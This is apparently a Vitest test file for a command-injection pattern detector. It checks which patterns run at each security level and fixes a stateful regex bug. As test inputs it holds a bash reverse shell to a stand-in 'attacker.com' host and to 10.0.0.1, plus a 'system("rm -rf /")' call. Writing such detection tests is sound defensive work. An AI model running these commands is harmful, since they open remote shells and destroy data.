import { describe, it, expect } from 'vitest';
import {
  validatePayloadSafetyWithLevel,
  detectPatternCategories
} from '@/security/layers/layer2-validators/pattern-detection.js';
import { ATTACK_PATTERNS } from '@/security/layers/layer-utils/content/patterns/index.js';

describe('Security level sub-category filtering', () => {
  describe('STORAGE level should not run EXECUTION_ONLY sub-categories', () => {
    it('should NOT flag "top" at STORAGE level (command.systemInfo is EXECUTION_ONLY)', () => {
      // "top" matches the /\btop\s*/gi regex in command.systemInfo
      // command.systemInfo is EXECUTION_ONLY, so it should not run at STORAGE
      const result = validatePayloadSafetyWithLevel(
        'the top priority items are listed below',
        'STORAGE'
      );
      expect(result.passed).toBe(true);
    });

    it('should NOT flag "whoami" at STORAGE level (command.systemInfo is EXECUTION_ONLY)', () => {
      const result = validatePayloadSafetyWithLevel(
        'run whoami to check the current user',
        'STORAGE'
      );
      expect(result.passed).toBe(true);
    });

    it('should NOT flag "ps " at STORAGE level (command.systemInfo is EXECUTION_ONLY)', () => {
      const result = validatePayloadSafetyWithLevel(
        'check ps output for running processes',
        'STORAGE'
      );
      expect(result.passed).toBe(true);
    });

    it('should NOT flag "curl" at STORAGE level (command.networkOperations is EXECUTION_ONLY)', () => {
      const result = validatePayloadSafetyWithLevel(
        'use curl to test the endpoint',
        'STORAGE'
      );
      expect(result.passed).toBe(true);
    });

    it('should NOT flag "grep" at STORAGE level (command.fileOperations is EXECUTION_ONLY)', () => {
      // Avoid path-like content that triggers ALWAYS_CHECK path traversal
      const result = validatePayloadSafetyWithLevel(
        'use grep to search for the pattern in output',
        'STORAGE'
      );
      expect(result.passed).toBe(true);
    });
  });

  describe('STORAGE level should still run ALWAYS_CHECK sub-categories', () => {
    it('should flag bash shell access at STORAGE level (command.shellAccess is ALWAYS_CHECK)', () => {
      const result = validatePayloadSafetyWithLevel(
        'bash -i >& /dev/tcp/attacker.com/4444',
        'STORAGE'
      );
      expect(result.passed).toBe(false);
      expect(result.violationType).toBe('COMMAND_INJECTION');
    });

    it('should flag /bin/sh at STORAGE level (command.shellAccess is ALWAYS_CHECK)', () => {
      const result = validatePayloadSafetyWithLevel(
        '/bin/sh -c "malicious"',
        'STORAGE'
      );
      expect(result.passed).toBe(false);
      expect(result.violationType).toBe('COMMAND_INJECTION');
    });

    it('should flag system() at STORAGE level (command.executionWrappers is ALWAYS_CHECK)', () => {
      const result = validatePayloadSafetyWithLevel(
        'system("rm -rf /")',
        'STORAGE'
      );
      expect(result.passed).toBe(false);
      expect(result.violationType).toBe('COMMAND_INJECTION');
    });
  });

  describe('EXECUTION level should run ALL sub-categories', () => {
    it('should flag "top" at EXECUTION level', () => {
      const result = validatePayloadSafetyWithLevel(
        'run top to check processes',
        'EXECUTION'
      );
      expect(result.passed).toBe(false);
      expect(result.reason).toContain('Top Process Monitor');
    });

    it('should flag "whoami" at EXECUTION level', () => {
      const result = validatePayloadSafetyWithLevel(
        'run whoami to check user',
        'EXECUTION'
      );
      expect(result.passed).toBe(false);
      expect(result.reason).toContain('User Identity');
    });
  });

  describe('QUERY level should not run EXECUTION_ONLY sub-categories', () => {
    it('should NOT flag "top" at QUERY level', () => {
      const result = validatePayloadSafetyWithLevel(
        'the top results are shown',
        'QUERY'
      );
      expect(result.passed).toBe(true);
    });

    it('should flag shell access at QUERY level (ALWAYS_CHECK)', () => {
      const result = validatePayloadSafetyWithLevel(
        'bash -i >& /dev/tcp/10.0.0.1/4444',
        'QUERY'
      );
      expect(result.passed).toBe(false);
    });
  });
});

describe('Regex lastIndex reset (stateful g-flag bug)', () => {
  it('detectPatternCategories should match consistently across repeated calls', () => {
    // The 'g' flag on RegExp makes .test() stateful — lastIndex advances.
    // Without the reset fix, the second call would start matching from where
    // the first call's match ended, potentially missing the pattern.
    const patterns = ATTACK_PATTERNS.command.systemInfo;
    const content = 'run top to monitor';

    // Call three times — all should match if lastIndex is properly reset
    for (let i = 0; i < 3; i++) {
      const result = detectPatternCategories(
        content,
        'Command injection',
        [patterns],
        'COMMAND_INJECTION'
      );
      expect(result.passed, `Call ${i + 1} should detect "top"`).toBe(false);
      expect(result.reason).toContain('Top Process Monitor');
    }
  });

  it('should not alternate between matching and not-matching on repeated calls', () => {
    // This is the specific bug: with 'g' flag and no lastIndex reset,
    // .test() returns true on call 1, false on call 2, true on call 3, etc.
    const patterns = ATTACK_PATTERNS.command.shellAccess;
    const content = '/bin/sh -c "test"';

    const results = [];
    for (let i = 0; i < 5; i++) {
      const result = detectPatternCategories(
        content,
        'Command injection',
        [patterns],
        'COMMAND_INJECTION'
      );
      results.push(result.passed);
    }

    // All calls should return the same result (false = detected)
    expect(results.every(r => r === results[0]),
      `Results should be consistent but got: ${results.join(', ')}`
    ).toBe(true);
    expect(results[0]).toBe(false);
  });

  it('should match the same pattern on different content strings', () => {
    const patterns = ATTACK_PATTERNS.command.systemInfo;

    // Two different strings that both contain "top"
    const result1 = detectPatternCategories(
      'run top now',
      'Command injection',
      [patterns],
      'COMMAND_INJECTION'
    );
    const result2 = detectPatternCategories(
      'check top status',
      'Command injection',
      [patterns],
      'COMMAND_INJECTION'
    );

    expect(result1.passed).toBe(false);
    expect(result2.passed).toBe(false);
  });
});
